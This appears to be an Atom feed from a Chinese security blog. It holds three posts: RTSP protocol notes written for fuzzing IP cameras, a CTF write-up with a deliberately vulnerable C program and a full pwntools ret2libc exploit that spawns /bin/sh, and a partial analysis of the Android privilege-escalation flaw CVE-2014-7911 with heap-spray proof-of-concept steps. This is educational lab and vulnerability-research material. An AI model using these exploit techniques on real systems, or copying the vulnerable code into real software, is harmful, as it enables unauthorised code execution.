<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hello! CytQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://imlzq.com/"/>
  <updated>2019-03-22T10:03:47.596Z</updated>
  <id>http://imlzq.com/</id>
  
  <author>
    <name>CytQ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RTSP协议-粗略版</title>
    <link href="http://imlzq.com/2019/03/22/RTSP%E5%8D%8F%E8%AE%AE-%E7%B2%97%E7%95%A5%E7%89%88/"/>
    <id>http://imlzq.com/2019/03/22/RTSP协议-粗略版/</id>
    <published>2019-03-21T16:00:00.000Z</published>
    <updated>2019-03-22T10:03:47.596Z</updated>
    
    <content type="html"><![CDATA[<p>毕业时用RTSP配合H264写了个简单的直播App，主要实现逻辑是用ffmpeg相关组件去播放和控制，核心是编解码和音视频的同步。这些是全应用层的东西，最近研究大华和海康威视的摄像头时，发现有写fuzzer的必要，那就必须把这协议的细节摸清楚，所以本文对此做个记录 : )</p><a id="more"></a><h1 id="Url"><a href="#Url" class="headerlink" title="Url"></a>Url</h1><p>rtsp_url = (“rtsp:”| “rtspu:”) “//” host [“:”port”] /[abs_path]/content_name</p><p>Such as : rtsp://192.168.1.13:554/cam/realmonitor?channel=1&amp;subtype=0</p><p>If we wanna use vlc or other stream players play it, we need set its username and password in the url.</p><blockquote><p> So it will be :  rtsp://admin:password@192.168.1.13:554/cam/realmonitor?channel=1&amp;subtype=0</p></blockquote><h1 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h1><p>OPTIONS，DESCRIBE，SETUP，PLAY，GET_PARAMETER，TEARDOWN</p><blockquote><p>Note: </p><p>“Clients” in this blog means stream players</p><p>“Server” in this blog means webcameras</p></blockquote><h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><ul><li>Client sends it to server</li><li>Server will return its methods.</li></ul><p><strong>E.G:</strong></p><p><strong>Request:</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/options_client.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/options_client.png"></p><p>As we see, Authorization in HEADER  contains username\password and other necessary information. 4G0324APAJCB429 in realm is the camera serial number and it’s the unique identification for every IOT hardware.</p><p><strong>Response:</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/options_server.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/options_server.png"></p><p>In the response, we can Public in HEADER . It contains all methods which supported by Server.</p><h2 id="DESCRIBE"><a href="#DESCRIBE" class="headerlink" title="DESCRIBE"></a>DESCRIBE</h2><ul><li>Client sends it to get specific media information.</li></ul><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/describe_client.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/describe_client.png"></p><p>Accept in HEADER will show what client want. In this request, it’s sdp (sdp is a protocol, I will introduce it in next blog)</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/describe_server.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/describe_server.png"></p><h2 id="SETUP"><a href="#SETUP" class="headerlink" title="SETUP"></a>SETUP</h2><p>This method has two steps.</p><p><strong>The first step:</strong></p><ul><li>Client will confirm how to transport and send this contract to server. Look at the “Transport”  in HEADER.  </li><li>If server agrees with that, it will generate a sessionID and returns it to the client.</li></ul><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_client_1.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_client_1.png"></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_server_1.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_server_1.png"></p><p><strong>The second step:</strong></p><ul><li>Client sends a new request with sessionID to establish the session</li><li>Client will start the play process until server confirms it.</li></ul><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_client_2.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_client_2.png"></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_server_2.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/setup_server_2.png"></p><h2 id="PLAY"><a href="#PLAY" class="headerlink" title="PLAY"></a>PLAY</h2><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/play_client.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/play_client.png"></p><p>npt in range is short for Normal Play Time. If we set it to 0, it will play now. If it’s 5, it will play until 5 seconds later.</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/play_server.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/play_server.png"></p><p>When server get the play request, server will put it into a queue and play them <strong>one by one</strong>.</p><h2 id="TEARDOWN"><a href="#TEARDOWN" class="headerlink" title="TEARDOWN"></a>TEARDOWN</h2><p>Terminate this session.</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/teardown_client.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/teardown_client.png"></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/teardown_server.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/rtsp/teardown_client.png"></p><h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a href="https://blog.csdn.net/qingkongyeyue/article/details/76735528" target="_blank" rel="noopener">RTSP重要方法:https://blog.csdn.net/qingkongyeyue/article/details/76735528</a></p><p><a href="https://blog.csdn.net/caoshangpa/article/details/53191630" target="_blank" rel="noopener">RTSP协议分析:https://blog.csdn.net/caoshangpa/article/details/53191630</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;毕业时用RTSP配合H264写了个简单的直播App，主要实现逻辑是用ffmpeg相关组件去播放和控制，核心是编解码和音视频的同步。这些是全应用层的东西，最近研究大华和海康威视的摄像头时，发现有写fuzzer的必要，那就必须把这协议的细节摸清楚，所以本文对此做个记录 : )&lt;/p&gt;
    
    </summary>
    
    
      <category term="协议" scheme="http://imlzq.com/tags/%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="RTSP" scheme="http://imlzq.com/tags/RTSP/"/>
    
  </entry>
  
  <entry>
    <title>CTF_PWN（一）</title>
    <link href="http://imlzq.com/2019/01/30/CTF_PWN1/"/>
    <id>http://imlzq.com/2019/01/30/CTF_PWN1/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-03-15T05:39:43.348Z</updated>
    
    <content type="html"><![CDATA[<p>因为工作性质，导致有些内容无法更新到博客上，但是久了不写感觉又不好，所以从今天起恢复博客的记录，顺便把之前本地记录的一些博客整理后补上来。</p><p>接下来几篇都会和CTF相关.</p><p>链接：</p><ul><li><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntool:      https://github.com/Gallopsled/pwntools</a></p></li><li><p><a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwndbg:       https://github.com/pwndbg/pwndbg</a></p></li><li><p><a href="https://github.com/bash-c/pwn_repo" target="_blank" rel="noopener">pwn_repo:     https://github.com/bash-c/pwn_repo</a></p></li><li>checksec</li><li>gdb</li><li>ida pro</li><li>metasploit</li></ul><p>本题开启了DEP和ASLR，需要先泄露libc的地址以求出system()和/bin/sh的实际地址</p><a id="more"></a>    <h2 id="Vulnerable-app-with-DEP-and-ASLR"><a href="#Vulnerable-app-with-DEP-and-ASLR" class="headerlink" title="Vulnerable app with DEP and ASLR"></a>Vulnerable app with DEP and ASLR</h2><h3 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code:"></a>Source code:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Generate-app-with-DEP"><a href="#Generate-app-with-DEP" class="headerlink" title="Generate app with DEP"></a>Generate app with DEP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o level2 level2.c</span><br></pre></td></tr></table></figure><p><strong>checksec:</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/ctf_1/checksec_level2.png" alt="checksec"></p><h3 id="Open-ASLR-on-Linux"><a href="#Open-ASLR-on-Linux" class="headerlink" title="Open  ASLR on Linux"></a>Open  ASLR on Linux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>The app can read 256 bytes into the buf but buf only has 128 bytes space. Stack overflow</p><p><strong>Note:</strong></p><ul><li>Because of the DEP, we can’t execute our shellcode which locates on the stack.</li><li>Because of the ASLR, we can’t use a static libc address to find or call system()</li></ul><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ol><li>We need to know the padding between buf and return address.</li><li>The app called write() in main() so we can use it to leak the libc address.</li><li>When we get the absolutely address of write(),  we can get the libc base address too<ol><li>libc_base_address = write_address -  write_offset</li></ol></li><li>Use libc_base_address get the address of system() and /bin/sh<ol><li>system() = write_address - (write_offset - system_offset)</li><li>/bin/sh = write_address - (write_offset - /bin/sh_offset)</li></ol></li><li>Run the app again and generate an legal shellcode to pwn it.</li></ol><p><strong>1、The first step: get padding between buf and return address:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q level2</span><br></pre></td></tr></table></figure><p><strong>Generate 300 random alphas with pwndbg which in gdb:</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic <span class="number">300</span></span><br></pre></td></tr></table></figure><p><strong>Then input r to run</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/ctf_1/cylic_300.png" alt="cycli"></p><p>Paste 300 bytes and the app will crash on 0x6261616b.Use cyclic to get the padding. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic -l 0x6261616b</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/ctf_1/cylic_l.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/ctf_1/cylic_l.png"></p><p>So the padding is 140 bytes.</p><p>Now we should generate shellcode to call write() so that we can system() address and /bin/sh address.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level2'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># vulfun_addr is the return address of write(). write(1,'write_got',4) 4代表输出4个字节，write_got则为要泄露的地址</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr)+p32(<span class="number">1</span>) +p32(got_w    rite) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br></pre></td></tr></table></figure><p>After this, we can generate shellcode to pwn:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">140</span>  + p32(system_addr) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>Here’s the full source code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level2'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#vulfun_addr is the return address of write().  write(1,'write_got',4) 4代表输出4个字节，write_got则为要泄露的地址</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr)+p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">140</span>  + p32(system_addr) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为工作性质，导致有些内容无法更新到博客上，但是久了不写感觉又不好，所以从今天起恢复博客的记录，顺便把之前本地记录的一些博客整理后补上来。&lt;/p&gt;
&lt;p&gt;接下来几篇都会和CTF相关.&lt;/p&gt;
&lt;p&gt;链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwntool:      https://github.com/Gallopsled/pwntools&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/pwndbg/pwndbg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwndbg:       https://github.com/pwndbg/pwndbg&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/bash-c/pwn_repo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwn_repo:     https://github.com/bash-c/pwn_repo&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;checksec&lt;/li&gt;
&lt;li&gt;gdb&lt;/li&gt;
&lt;li&gt;ida pro&lt;/li&gt;
&lt;li&gt;metasploit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本题开启了DEP和ASLR，需要先泄露libc的地址以求出system()和/bin/sh的实际地址&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="CTF" scheme="http://imlzq.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Android系统提权：CVE-2014-7911</title>
    <link href="http://imlzq.com/2018/09/28/cve-2014-7911/"/>
    <id>http://imlzq.com/2018/09/28/cve-2014-7911/</id>
    <published>2018-09-28T04:00:00.000Z</published>
    <updated>2018-10-12T07:02:10.758Z</updated>
    
    <content type="html"><![CDATA[<p>本文内容：</p><ul><li>因Android反序列化漏洞导致的Android本地提权</li><li>Android平台上的ROP：绕过DEP</li><li>绕过Android平台的ASLR</li><li>Android Binder</li><li>Java序列化与反序列化</li><li>Heap Spary</li></ul><p><strong>CVE-2014-7911</strong></p><p>摘自NVD</p><blockquote><p>luni/src/main/java/java/io/ObjectInputStream.java in the java.io.ObjectInputStream implementation in Android before 5.0.0 does not verify that deserialization will result in an object that met the requirements for serialization, which allows attackers to execute arbitrary code via a crafted finalize method for a serialized object in an ArrayMap Parcel within an intent sent to system_service, as demonstrated by the finalize method of android.os.BinderProxy, aka Bug 15874291.</p><p><strong>Source:</strong>  MITRE<br><strong>Description Last Modified:</strong>  12/15/2014</p></blockquote><p>POC: <a href="https://github.com/CytQ/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/CytQ/CVE-2014-7911_poc</a></p><a id="more"></a><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>Android5.0以下的ObjectInputStream在反序列化时没有校验该java对象是否可序列化。因此攻击者可精心构建一个不可序列化的对象以及恶意的成员变量。当该恶意对象被反序列化时会产生类型混淆（type confusion），使恶意的成员变量被当成本地代码的指针，从而执行shellCode</p><h3 id="Target：-android-os-BinderProxy"><a href="#Target：-android-os-BinderProxy" class="headerlink" title="Target： android.os.BinderProxy"></a>Target： android.os.BinderProxy</h3><p>这个类本身是不可序列化的，他有个成员变量mOrgue。在系统GC的时候，会调用它的finalize方法，这个方法会将该类的mOrgue参数强制转换为对象指针A，如果我们能控制mOrgue，就能控制接下来程序执行的逻辑了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下代码不来自同一个类，核心内容拼接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BinderProxy</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">destroy();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">super</span>.finalize();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Native。对应的实现为：android_os_BinderProxy_destroy</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Native层</span></span><br><span class="line"><span class="comment">// 初始化mOrgue</span></span><br><span class="line">gBinderProxyOffsets.mObject  = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</span><br><span class="line">gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IBinder* b = (IBinder*)</span><br><span class="line">env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    <span class="comment">// gBinderProxyOffsets.mOrgue 被强制转换为DeathRecipientList对象</span></span><br><span class="line">    <span class="comment">// 也就是说mOrgue在类型混淆后被处理成了对象指针this</span></span><br><span class="line">DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">        env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 调用drl的decstrong方法。此时的this由攻击者控制</span></span><br><span class="line">drl-&gt;decstrong((<span class="keyword">void</span>*)javaobjectforibinder);</span><br><span class="line">b-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上文能看到，类型混淆后drl已经转交给攻击者控制。</p><p>DeathRecipientList继承自RefBase，desStrong的实现为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RefBase</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RefBase</span>:</span>:weakref_impl : <span class="keyword">public</span> RefBase::weakref_type</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mStrong;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mWeak;</span><br><span class="line">    RefBase* <span class="keyword">const</span>      mBase;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mFlags;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RefBase.cpp</span></span><br><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 攻击这个方法</span></span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mRefs是RefBase的第一个成员变量，RefBase是DeathRecipientList的父类。因此对象布局为先放置父类，然后放置自己的成员。对象中的方法不占空间，如果有虚函数会有一个虚函数表的地址（4字节放置在对象的最开始），然后放置成员变量。</p><blockquote><p>故mRefs变量的地址=DeathRecipientList地址+4 = mOrgue指针指向的地址+4</p></blockquote><p>因此refs的地址我们可控，refs-&gt;mBase（算偏移即可）亦可控，只要我们构造特殊的内存布局就可以通过refs-&gt;mBase-&gt;onLastStrongRef(id)执行任意代码</p><h2 id="POC验证"><a href="#POC验证" class="headerlink" title="POC验证"></a>POC验证</h2><p>POC：<a href="https://github.com/CytQ/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/CytQ/CVE-2014-7911_poc</a></p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h3><p>安装APP，点击Hello World按钮后logcat会显示sparying日志，如下：</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log1.jpeg" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log1.jpeg"></p><p>当sparying显示到1900后，等待30秒，按home键返回桌面，再等30秒，点击任意APP，等待1~2分钟（这是为了sparying完后能触发一次gc）。手机重启，验证成功，显示如下：</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log2.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log2.png"></p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h3><ul><li>注释POC 1中的heap_spary_ex()函数以及expolit(int static_address)中的evilProxy.mOrgue = static_address;</li><li>运行程序，evilProxy.mOrgue = 0x1337beef // 该地址无意义</li></ul><p>当系统崩溃时，能拦截到如下的日志：</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log3.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log3.png"></p><p>此时的fault addr等于mOrgue，说明类型强转后跳转到的1337beef这个地址无效，验证成功</p><h2 id="Poc-2-攻击原理"><a href="#Poc-2-攻击原理" class="headerlink" title="Poc 2 攻击原理"></a>Poc 2 攻击原理</h2><h3 id="构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP-Chain的起始地址-验证POC时这里是一个随机无效地址"><a href="#构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP-Chain的起始地址-验证POC时这里是一个随机无效地址" class="headerlink" 